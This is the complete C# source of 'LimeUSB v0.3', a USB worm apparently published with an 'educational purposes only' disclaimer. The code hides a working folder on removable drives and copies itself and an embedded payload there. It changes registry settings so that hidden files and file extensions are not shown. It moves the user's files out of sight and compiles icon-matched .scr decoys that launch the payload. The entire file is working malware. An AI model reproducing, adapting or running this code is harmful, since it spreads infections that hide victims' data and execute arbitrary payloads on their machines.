using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Drawing.IconLib;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Drawing;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using Microsoft.VisualBasic.Devices;

//
//       │ Author     : NYAN CAT
//       │ Name       : LimeUSB v0.3

//       Contact Me   : https://github.com/NYAN-x-CAT
//       This program Is distributed for educational purposes only.
//

namespace LimeUSB_Csharp
{
    class Program
    {
        public static void Main()
        {
            Initialize();
        }

        public static void Initialize()
        {
            ExplorerOptions();

            foreach (DriveInfo usb in DriveInfo.GetDrives())
            {
                try
                {
                    if (usb.DriveType == DriveType.Removable && usb.IsReady)
                    {
                        if (!Directory.Exists(usb.RootDirectory.ToString() + Settings.WorkDirectory))
                        {
                            Directory.CreateDirectory(usb.RootDirectory.ToString() + Settings.WorkDirectory);
                            File.SetAttributes(usb.RootDirectory.ToString() + Settings.WorkDirectory, FileAttributes.System | FileAttributes.Hidden);
                        }

                        if (!Directory.Exists((usb.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.IconsDirectory)))
                            Directory.CreateDirectory((usb.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.IconsDirectory));

                        if (!File.Exists(usb.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.LimeUSBFile))
                            File.Copy(Application.ExecutablePath, usb.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.LimeUSBFile);

                        if (!File.Exists(usb.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.PayloadFile))
                            File.WriteAllBytes(usb.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.PayloadFile, Properties.Resources.Payload);

                        CreteDirectory(usb.RootDirectory.ToString());
                        InfectFiles(usb.RootDirectory.ToString());
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Initialize " + ex.Message);
                }
            }
        }

        public static void ExplorerOptions()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
            if (key.GetValue("Hidden") != (object)2)
                key.SetValue("Hidden", 2);
            if (key.GetValue("HideFileExt") != (object)1)
                key.SetValue("HideFileExt", 1);
        }

        public static void InfectFiles(string path)
        {
            foreach (var file in Directory.GetFiles(path))
            {
                try
                {
                    if (CheckIfInfected(file))
                    {
                        ChangeIcon(file);
                        File.Move(file, file.Insert(3, Settings.WorkDirectory + "\\"));
                        CompileFile(file);
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("InfectFiles " + ex.Message);
                }
            }

            foreach (var directory in Directory.GetDirectories(path))
            {
                if (!directory.Contains(Settings.WorkDirectory))
                    InfectFiles(directory);
            }
        }

        public static void CreteDirectory(string usbDirectory)
        {
            foreach (var directory in Directory.GetDirectories(usbDirectory))
            {
                try
                {
                    if (!directory.Contains(Settings.WorkDirectory))
                    {
                        if (!Directory.Exists(directory.Insert(3, Settings.WorkDirectory + "\\")))
                            Directory.CreateDirectory(directory.Insert(3, Settings.WorkDirectory + "\\"));
                        CreteDirectory(directory);
                    }
                }
                catch
                {
                }
            }
        }

        public static bool CheckIfInfected(string file)
        {
            try
            {
                FileVersionInfo info = FileVersionInfo.GetVersionInfo(file);
                if (info.LegalTrademarks == Settings.InfectedTrademark)
                    return false;
                else
                    return true;
            }
            catch
            {
                return false;
            }
        }

        public static void ChangeIcon(string file)
        {
            try
            {
                Icon fileIcon = Icon.ExtractAssociatedIcon(file);
                MultiIcon multiIcon = new MultiIcon();
                SingleIcon singleIcon = multiIcon.Add(Path.GetFileName(file));
                singleIcon.CreateFrom(fileIcon.ToBitmap(), IconOutputFormat.Vista);
                singleIcon.Save(Path.GetPathRoot(file) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(file.Replace(" ", null)) + ".ico");
            }
            catch { }
        }

        public static void CompileFile(string infectedFile)
        {
            try
            {
                string source = Properties.Resources.Source;
                source = source.Replace("%Payload%", Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.PayloadFile);
                source = source.Replace("%File%", infectedFile.Insert(3, Settings.WorkDirectory + "\\"));
                source = source.Replace("%USB%", Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.LimeUSBFile);
                source = source.Replace("%Lime%", Settings.InfectedTrademark);
                source = source.Replace("%LimeUSBModule%", Randomz(new Random().Next(6, 12)));
                source = source.Replace("%Guid%", Guid.NewGuid().ToString());

                CompilerParameters cParams = new CompilerParameters();
                Dictionary<string, string> providerOptions = new Dictionary<string, string>();
                providerOptions.Add("CompilerVersion", GetOS());

                string options = "/target:winexe /platform:x86 /optimize+";
                if (File.Exists(Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico"))
                    options += " /win32icon:\"" + Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico" + "\"";
                cParams.GenerateExecutable = true;
                cParams.OutputAssembly = infectedFile + ".scr";
                cParams.CompilerOptions = options;
                cParams.TreatWarningsAsErrors = false;
                cParams.IncludeDebugInformation = false;
                cParams.ReferencedAssemblies.Add("System.dll");

                CompilerResults results = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(cParams, source);

                //if (results.Errors.Count > 0)
                //{
                //    MessageBox.Show(string.Format("The compiler has encountered {0} errors",
                //         results.Errors.Count), "Errors while compiling", MessageBoxButtons.OK,
                //         MessageBoxIcon.Error);

                //    foreach (CompilerError Err in results.Errors)
                //    {
                //        MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", Err.ErrorText,
                //            Err.Line, Err.Column, Err.FileName), "Error",
                //            MessageBoxButtons.OK, MessageBoxIcon.Error);
                //    }
                //    return;
                //}
            }
            catch (Exception ex)
            {
                Debug.WriteLine("CompileFile " + ex.Message);
            }
        }

        public static string GetOS()
        {
            var os = new ComputerInfo();
            if (os.OSFullName.Contains("7"))
                return "v2.0";
            else
                return "v4.0";
        }

        public static string Randomz(int L)
        {
            string validchars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            StringBuilder sb = new StringBuilder();
            Random rand = new Random();
            for (int i = 1; i <= L; i++)
            {
                int idx = rand.Next(0, validchars.Length);
                char randomChar = validchars[idx];
                sb.Append(randomChar);
            }
            var randomString = sb.ToString();
            return randomString;
        }
    }

    public class Settings
    {
        public static readonly string InfectedTrademark = "Trademark - Lime";
        public static readonly string WorkDirectory = "$LimeUSB";
        public static readonly string LimeUSBFile = "LimeUSB.exe";
        public static readonly string PayloadFile = "Payload.exe";
        public static readonly string IconsDirectory = "$LimeIcons";
    }

}
